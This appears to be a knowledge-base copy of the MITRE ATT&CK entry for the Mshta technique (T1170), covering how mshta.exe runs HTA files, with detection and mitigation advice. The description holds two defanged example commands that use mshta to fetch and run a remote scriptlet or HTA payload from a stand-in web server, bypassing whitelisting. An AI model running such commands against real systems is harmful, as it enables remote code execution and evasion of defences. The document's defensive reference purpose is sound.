---
id: 70802b9e-588c-4d59-b66e-9f041e427c8a
name: Mshta
type: technique
mitre_id: T1170
mitre_url: null
created_at: '2019-08-28T21:17:26.750311+00:00'
updated_at: '2023-05-29T16:48:53.672970+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
---

# Mshta

**MITRE ID**: T1170

## Description

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. [1] HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. [2]Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code [3] [4] [5] [6] [7] Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]htaMshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. [8]

# Detection

Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious.

# Mitigation

Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life. Use application whitelisting configured to block execution of mshta.exe if it is not required for a given system or network to prevent potential misuse by adversaries.

# Footnotes

[1] Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.

[2] Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.

[3] Gross, J. (2016, February 23). Operation Dust Storm. Retrieved September 19, 2017.

[4] McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.

[5] Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.

[6] Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.

[7] Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.

[8] Smith, C. (2017, July 14). TheList.txt. Retrieved October 27, 2017.

[9] Dahan, A. (2017, May 24). OPERATION COBALT KITTY: A LARGE-SCALE APT IN ASIA CARRIED OUT BY THE OCEANLOTUS GROUP. Retrieved November 5, 2018.

[10] Dahan, A. (2017). Operation Cobalt Kitty. Retrieved December 27, 2018.

[11] Magius, J., et al. (2017, July 19). Koadic. Retrieved June 18, 2018.

[12] Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018.

[13] Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018.

[14] F-Secure Labs. (2016, July). NANHAISHU RATing the South China Sea. Retrieved July 6, 2018.

[15] Xiao, C. (2018, September 17). Xbash Combines Botnet, Ransomware, Coinmining in Worm that Targets Linux and Windows. Retrieved November 14, 2018.

## Defense

Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life. Use application whitelisting configured to block execution of mshta.exe if it is not required f

## Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
